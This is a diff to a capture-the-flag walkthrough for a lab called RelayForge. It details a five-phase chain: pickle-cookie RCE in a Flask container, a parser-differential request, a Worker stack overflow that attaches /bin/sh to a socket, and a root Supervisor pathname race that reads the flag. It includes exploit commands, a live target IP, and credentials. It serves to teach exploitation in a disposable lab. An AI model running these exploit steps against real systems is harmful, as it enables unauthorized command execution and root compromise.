@@ -12,7 +12,8 @@ privileged pathname race. Do not aim these techniques at unrelated systems.
 
 ## What the player receives
 
-For the current EC2 deployment:
+For the current EC2 deployment (replace this IP if the organizer gives you a
+different target):
 
 ```text
 Portal:   https://18.216.228.46/login
@@ -147,24 +148,32 @@ run reports stages resembling:
 
 ```text
 [+] login: guest authenticated
-[+] pickle RCE: Web UID 65532; relay_web credential recovered
+[+] stage 1 marker: Web UID 65532; relay_web credential recovered
 [+] DB boundary: private.jobs denied to relay_web (SQLSTATE 42501)
 [+] parser differential: raw request <UUID>
 [+] signed job: running on port 250xx
 [+] relay boundary: bidirectional tunnel reached the approved HTTP endpoint
 [+] token gate: wrong rejected; valid accepted for job <UUID>
 [+] Worker corruption: callback redirected via 0x...
-[+] host shell: uid relay
-[+] direct flag read: denied
-[+] Supervisor TOCTOU: unrestricted host shell uid=0
-[+] root flag: disclosed directly from the UID-0 shell
+[+] stage 2 marker: host shell is uid relay
+[+] root-only marker and flag: denied to relay
+[+] stage 3 marker: Supervisor TOCTOU yielded unrestricted host uid=0
+[+] root flag: obtained from the UID-0 command stream
 RF{...}
 ```
 
 This is the acceptance verifier, not the best way to learn the chain. The next
 sections separate the same process into understandable player actions.
 
-## Stage 1: turn the authenticated cookie into Web command execution
+## Attack phase 1: turn the authenticated cookie into Web command execution
+
+**Goal.** Obtain a repeatable command-execution primitive inside the Web
+container and identify the privilege boundary actually crossed.
+
+**Why this route is possible.** A normal login supplies the Flask session
+needed to reach `/dashboard`. The separate `remember_prefs` cookie is then
+deserialized by application code, so an authenticated player controls data
+that reaches the permitted preference classes.
 
 The dashboard decodes a base64 `remember_prefs` cookie with a restricted
 Python unpickler. The restriction permits only three preference classes, but
@@ -176,7 +185,11 @@ JobRunner.__setstate__   -> launches that text with subprocess.Popen
 ```
 
 The login still matters. `/dashboard` processes the cookie only after a valid
-Flask session passes `@login_required`.
+Flask session passes `@login_required`. The helper authenticates, replaces the
+`remember_prefs` cookie with a malicious pickle, requests `/dashboard` to
+trigger deserialization, waits for the detached command to finish, and then
+retrieves its one-shot output. It automates a browser/session workflow; it is
+not connecting to an undocumented shell service.
 
 Use the stage-one helper to perform one command at a time.
 
@@ -211,6 +224,21 @@ uid=65532 gid=65532
 This is command execution inside the Flask Web container. It is not root, the
 Ubuntu `student30` account, or the Docker daemon.
 
+Read the first access breadcrumb through the same command-execution primitive:
+
+```bash
+python3 web/tools/exploit_stage1.py \
+  https://18.216.228.46 \
+  --username guest \
+  --password guest-relay-2026 \
+  --insecure \
+  --command 'cat /opt/relayforge/web/STAGE_1_WEB.txt'
+```
+
+Its first line is `RELAYFORGE_STAGE=1_WEB_CONTAINER`; the rest explains this
+identity's boundary and the next intended step. A direct browser GET for this
+path returns 404 because the file is an RCE breadcrumb, not a public route.
+
 Inspect the database identity made available to the Web process:
 
 ```bash
@@ -227,10 +255,25 @@ password to serve the portal, so Web command execution can use that credential.
 However, `relay_web` cannot directly read `private.jobs`, steal the signing
 key, claim Dispatcher work, or launch a Worker.
 
-Primitive gained: a command as Web UID 65532 plus one intentionally restricted
-database capability.
+**Evidence.** `id` reports UID 65532 and the Stage 1 breadcrumb is readable.
+Those observations together locate the foothold; marker text alone is not
+privilege proof because it is source-known teaching material.
 
-## Stage 2: submit a request that two components parse differently
+**Still blocked.** This identity has no host filesystem, Docker socket,
+signing key, private-table access, or direct Supervisor access.
+
+**Next decision.** Use the one database capability granted to the Web role and
+look for a policy/parser disagreement that causes trusted components to
+provision a host Worker.
+
+## Attack phase 2: submit a request that two components parse differently
+
+**Goal.** Turn the Web foothold into an approved legacy-mode Worker without
+forging a signature or choosing an arbitrary destination.
+
+**Why the previous access permits it.** The Web role cannot access private job
+tables, but it may execute one raw-request RPC. Access later claims that row,
+applies policy, and signs the result with a key the attacker never receives.
 
 The public form always submits a fixed safe profile. From the Web foothold,
 call the non-public raw-request RPC with a duplicated `profile` key:
@@ -257,6 +300,11 @@ Why the duplicate key works:
 The options cannot choose an IP, port, URL, pathname, or command. The protected
 database record still fixes the tunnel destination.
 
+The **request UUID** identifies the user-facing database request and belongs in
+`/connections/<REQUEST-UUID>`. It is not the **job UUID** printed later by the
+Worker banner. Save both under different variable names; the final Supervisor
+operation requires the job UUID.
+
 While logged into the browser, open:
 
 ```text
@@ -275,13 +323,28 @@ Token:       the 48 hexadecimal characters following /relay/
 The link should still display the private sample page. That proves this
 legacy-mode Worker is a real tunnel rather than a fake success banner.
 
-The requested lifetime is 420 seconds. Complete the Worker and race stages
+**Evidence.** The browser status becomes running, the page supplies a tokenized
+`25000-25099` URL, and that URL returns the private sample page. This proves
+the signed provisioning chain and tunnel work; it does not prove a shell.
+
+**Still blocked.** The Worker requires its random bearer token, and normal HTTP
+forwarding does not expose the debug protocol or a command shell.
+
+**Next decision.** Use the disclosed token on a separate protocol connection,
+prove the gate is real, and retain the job UUID needed by Supervisor later.
+
+The requested lifetime is 420 seconds. Complete the Worker and race phases
 before that countdown expires. If it expires, submit a new raw request and use
 its new port, token, and job UUID.
 
-Primitive gained: a signed, token-protected legacy Worker on the Ubuntu host.
+## Attack phase 3: authenticate to the Worker protocol
 
-## Stage 3: understand the Worker protocol
+**Goal.** Open a dedicated debug-protocol connection and learn the active job
+UUID while proving that an incorrect token is rejected.
+
+**Why the previous access permits it.** The connection page discloses the
+Worker port and bearer token to the owner of the approved request. No port scan
+or token guess is required.
 
 A browser request and the challenge protocol use the same listening port but
 different first messages:
@@ -343,7 +406,32 @@ OK
 Save the job UUID from the banner. It identifies the active transient systemd
 unit and is required by the final diagnostic request.
 
-## Stage 4: leak the PIE address and overwrite the callback
+Use separate TCP connections for separate modes:
+
+- a browser `GET /relay/<token>/...` connection becomes HTTP forwarding;
+- a `CONNECT` debug command becomes raw tunnel forwarding; and
+- the `LEAK`/`OVERFLOW` sequence must stay on its own authenticated debug
+  connection.
+
+Once a connection enters forwarding mode, it no longer parses debug commands.
+
+**Evidence.** A changed token returns `ERR auth`; the real token returns the
+Worker banner plus `OK`, including the job UUID.
+
+**Still blocked.** Authentication reaches only the Worker protocol. It does
+not change the process identity or bypass the native memory-safety boundary.
+
+**Next decision.** Exercise the legacy-only information leak, then use that
+runtime address in the deliberately bounded callback overwrite.
+
+## Attack phase 4: leak the PIE address and overwrite the callback
+
+**Goal.** Convert the legacy Worker protocol into command execution as the
+native host `relay` account.
+
+**Why the previous access permits it.** The duplicated profile selected
+legacy mode in the Worker, enabling two intentionally vulnerable debug
+commands on the authenticated connection.
 
 Continue in the same Python prompt:
 
@@ -368,10 +456,14 @@ Why both steps are required:
 - `LEAK` reveals its current address only in legacy mode.
 - The vulnerable frame contains a 128-byte buffer followed by an eight-byte
   callback.
-- The 136-byte payload fills the buffer and replaces only that callback with
-  the leaked address.
+- `struct.pack("<Q", address)` writes that 64-bit address in the little-endian
+  byte order used by AMD64.
+- The 136-byte payload fills the buffer and replaces only the next eight-byte
+  callback with the leaked address.
 - NX, stack canaries, and full RELRO stay enabled. The attack redirects an
   existing function pointer rather than injecting executable bytes.
+- When Worker invokes the overwritten callback, control reaches the existing
+  `worker_shell` function and attaches `/bin/sh -i` to this socket.
 
 Expected response:
 
@@ -383,19 +475,50 @@ The socket is now attached to `/bin/sh -i` as the host `relay` user. Send a
 command and read its output:
 
 ```python
-s.sendall(b"id; pwd; cat /var/lib/relayforge/flag/root.txt 2>&1\n")
+s.sendall(
+    b"id; pwd; "
+    b"cat /var/lib/relayforge/stages/STAGE_2_WORKER.txt; "
+    b"cat /var/lib/relayforge/stages/STAGE_3_ROOT.txt 2>&1; "
+    b"cat /var/lib/relayforge/flag/root.txt 2>&1\n"
+)
 time.sleep(0.4)
 print(s.recv(8192).decode(errors="replace"))
 ```
 
-`id` should show `relay`. The direct flag read should return permission denied.
-That is expected: Worker exploitation gives an unprivileged host shell, not
-root.
+`id` should show `relay`. Stage 2 should be readable, while the Stage 3 marker
+and root flag should both return permission denied. That is expected: Worker
+exploitation gives an unprivileged host shell, not root.
 
-Primitive gained: command execution as the Ubuntu host's nonlogin `relay` user
-inside the active Worker systemd cgroup.
+**Evidence.** `id` reports the host `relay` account and Stage 2 is readable;
+attempts to read Stage 3 and the root flag fail. The UID and denials are the
+security evidence, while the marker explains what they mean.
 
-## Stage 5: exploit the Supervisor pathname race
+**Still blocked.** `relay` has no sudo, capabilities, Docker access, signing
+key, or permission to read the root flag. Its systemd service is sandboxed and
+short-lived.
+
+**Next decision.** Inspect the only privileged API intentionally reachable
+from this identity: Supervisor `diagnose`. Its peer checks require this exact
+host UID and active Worker cgroup, so the race helper must run through the
+shell just obtained.
+
+## Attack phase 5: exploit the Supervisor pathname race
+
+**Goal.** Cause the root Supervisor to execute attacker-selected bytes as real
+host UID 0, then prove that boundary with identity and root-only reads.
+
+**Why the previous access permits it.** Supervisor accepts `diagnose` only
+when all of these checks hold:
+
+- the Unix-socket peer UID is the host `relay` UID;
+- the peer PID belongs to the supplied job's active transient Worker cgroup;
+- that job has not expired and its unit is still active;
+- the requested basename is exactly `diagnostic.sh`; and
+- the first file is a regular, relay-owned, mode-`0700`, single-link file with
+  the exact approved bytes.
+
+A Web-container process, Dispatcher process, ordinary host user, expired
+Worker, or process merely possessing the job UUID fails at least one gate.
 
 The root Supervisor exposes one `diagnose` operation over a Unix socket. It
 accepts it only when the kernel reports UID `relay`, the caller PID belongs to
@@ -428,7 +551,8 @@ Conceptually, the command running in the relay shell is:
 python3 /tmp/exploit_supervisor_race.py <JOB-UUID>
 ```
 
-That default mode proves UID 0 and reads the flag, then exits. To keep the
+That default mode proves UID 0, reads the Stage 3 root-only marker and reads the
+flag, then exits. To keep the
 same socket bridged to an interactive root shell for the short diagnostic
 window, use:
 
@@ -442,7 +566,7 @@ disposable exercise.
 
 To transfer it manually, continue in the same local Python prompt. This
 assumes the prompt was started from the extracted release root and that
-`banner` and `s` still contain the values from stages 3 and 4:
+`banner` and `s` still contain the values from attack phases 3 and 4:
 
 ```python
 import base64, pathlib, re, secrets, shlex
@@ -478,12 +602,18 @@ while marker.encode("ascii") not in received:
 print(received.decode(errors="replace"))
 
 root_identity = re.search(rb"(?m)^ROOT_UID=0\r?$", received)
+root_stage = re.search(
+    rb"(?m)^ROOT_STAGE=3_UNRESTRICTED_HOST_ROOT\r?$", received
+)
 flag = re.search(rb"(?m)^ROOT_FLAG=(RF\{[0-9a-f]{32}\})\r?$", received)
 if root_identity is None:
     raise RuntimeError("diagnostic race did not produce UID 0")
+if root_stage is None:
+    raise RuntimeError("UID-0 process did not read the root-only stage marker")
 if flag is None:
     raise RuntimeError("root shell did not return the flag")
 print(root_identity.group(0).decode("ascii"))
+print(root_stage.group(0).decode("ascii"))
 print(flag.group(1).decode("ascii"))
 ```
 
@@ -497,8 +627,13 @@ like:
 
 ```text
 ROOT_UID=0
+ROOT_STAGE=3_UNRESTRICTED_HOST_ROOT
 ROOT_FLAG=RF{...}
 ```
+
+**Evidence.** `ROOT_UID=0` proves the effective identity, the Stage 3 line
+proves that process can read a root-only host file, and `ROOT_FLAG` proves the
+objective. No marker by itself proves privilege.
 
 This is genuine unrestricted host-root execution. The child can perform any
 operation allowed to root on that VM. The challenge helper demonstrates only
@@ -555,6 +690,11 @@ Therefore:
 - Assuming Web RCE is host root. It is UID 65532 in a read-only container.
 - Assuming the Worker shell can directly read the flag. Permission denied is
   expected; the Supervisor diagnostic race is the required escalation to UID 0.
+- Confusing the request UUID in the browser URL with the job UUID in the
+  Worker banner. The final diagnose request needs the job UUID.
+- Treating a marker string as proof by itself. Confirm effective UID, expected
+  denials, Worker cgroup context, and root-only reads at the corresponding
+  boundary.
 - Treating `reset-lab.sh` as trustworthy cleanup after root compromise. Rebuild
   the disposable VM, because a root payload could persist outside challenge
   state.
